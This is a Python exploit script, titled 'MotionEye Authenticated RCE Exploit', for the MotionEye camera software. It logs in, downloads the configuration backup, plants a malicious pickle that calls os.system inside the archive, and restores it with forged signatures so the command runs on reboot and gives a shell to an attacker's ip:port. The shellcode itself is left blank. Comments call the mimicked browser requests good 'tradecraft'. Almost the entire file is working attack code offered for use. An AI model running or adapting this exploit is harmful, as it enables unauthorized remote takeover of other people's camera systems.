#!/usr/bin/env python3

import requests
import argparse
import os
import pickle
import hashlib
import tarfile
import time
import string
import random
from requests_toolbelt import MultipartEncoder
import json


# proxies = {"http": "http://127.0.0.1:9090", "https": "http://127.0.0.1:9090"}
proxies = {}


def get_cli_args():
    parser = argparse.ArgumentParser(description="MotionEye Authenticated RCE Exploit")
    parser.add_argument(
        "--victim",
        help="Victim url in format ip:port, or just ip if port 80",
        required=True,
    )
    parser.add_argument("--attacker", help="ipaddress:port of attacker", required=True)
    parser.add_argument(
        "--username", help="username of web interface, default=admin", default="admin"
    )
    parser.add_argument(
        "--password", help="password of web interface, default=blank", default=""
    )
    args = parser.parse_args()
    return args


def login(username, password, victim_url):
    session = requests.Session()
    useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
    headers = {"User-Agent": useragent}
    login_url = f"http://{victim_url}/login/"
    body = f"username={username}&password={password}"
    session.post(login_url, headers=headers, data=body)
    return session


def download_config(username, victim_url, session):
    download_url = f"http://{victim_url}/config/backup/?_username={username}&_signature=5907c8158417212fbef26936d3e5d8a04178b46f"
    backup_file = session.get(download_url)
    open("motioneye-config.tar.gz", "wb").write(backup_file.content)
    return


def create_pickle(ip_address, port):
    shellcode = ""  # put your shellcode here

    class EvilPickle(object):
        def __reduce__(self):
            cmd = shellcode
            return os.system, (cmd,)

    # need protocol=2 and fix_imports=True for python2 compatibility
    pickle_data = pickle.dumps(EvilPickle(), protocol=2, fix_imports=True)
    with open("tasks.pickle", "wb") as file:
        file.write(pickle_data)
        file.close()
    return


def decompress_add_file_recompress():
    with tarfile.open("./motioneye-config.tar.gz") as original_backup:
        original_backup.extractall("./motioneye-config")
        original_backup.close()
    original_backup.close()
    os.remove("./motioneye-config.tar.gz")
    # move malicious tasks.pickle into the extracted directory and then tar and gz it back up
    os.rename("./tasks.pickle", "./motioneye-config/tasks.pickle")
    with tarfile.open("./motioneye-config.tar.gz", "w:gz") as config_tar:
        config_tar.add("./motioneye-config/", arcname=".")
    config_tar.close()
    return


def restore_config(username, password, victim_url, session):
    # a lot of this is not necessary, but makes for good tradecraft
    # recreated 'normal' requests as closely as I could
    t = int(time.time() * 1000)
    path = f"/config/restore/?_={t}&_username={username}"
    # admin_hash is the sha1 hash of the admin's password, which is '' in the default case
    admin_hash = hashlib.sha1(password.encode("utf-8")).hexdigest().lower()
    signature = (
        hashlib.sha1(f"POST:{path}::{admin_hash}".encode("utf-8")).hexdigest().lower()
    )
    restore_url = f"http://{victim_url}/config/restore/?_={t}&_username=admin&_signature={signature}"

    # motioneye checks for "---" as a form boundary. Python Requests only prepends "--"
    # so we have to manually create this
    files = {
        "files": (
            "motioneye-config.tar.gz",
            open("motioneye-config.tar.gz", "rb"),
            "application/gzip",
        )
    }

    useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
    boundary = "----WebKitFormBoundary" + "".join(
        random.sample(string.ascii_letters + string.digits, 16)
    )

    m = MultipartEncoder(fields=files, boundary=boundary)
    headers = {
        "Content-Type": m.content_type,
        "User-Agent": useragent,
        "X-Requested-With": "XMLHttpRequest",
        "Cookie": "meye_username=_; monitor_info_1=; motion_detected_1=false; capture_fps_1=5.6",
        "Origin": f"http://{victim_url}",
        "Referer": f"http://{victim_url}",
        "Accept-Language": "en-US,en;q=0.9",
    }
    response = session.post(restore_url, data=m, headers=headers, proxies=proxies)
    # if response == reboot false then we need reboot routine
    content = json.loads(response.content.decode("utf-8"))

    if content["reboot"] == True:
        print("Rebooting! Stand by for shell!")
    else:
        print("Manual reboot needed!")
    return


if __name__ == "__main__":
    print("Running exploit!")
    arguments = get_cli_args()
    session = login(arguments.username, arguments.password, arguments.victim)
    download_config(arguments.username, arguments.victim, session)
    # sends attacker ip and port as arguments to create the pickle
    create_pickle(arguments.attacker.split(":")[0], arguments.attacker.split(":")[1])
    decompress_add_file_recompress()
    restore_config(arguments.username, arguments.password, arguments.victim, session)
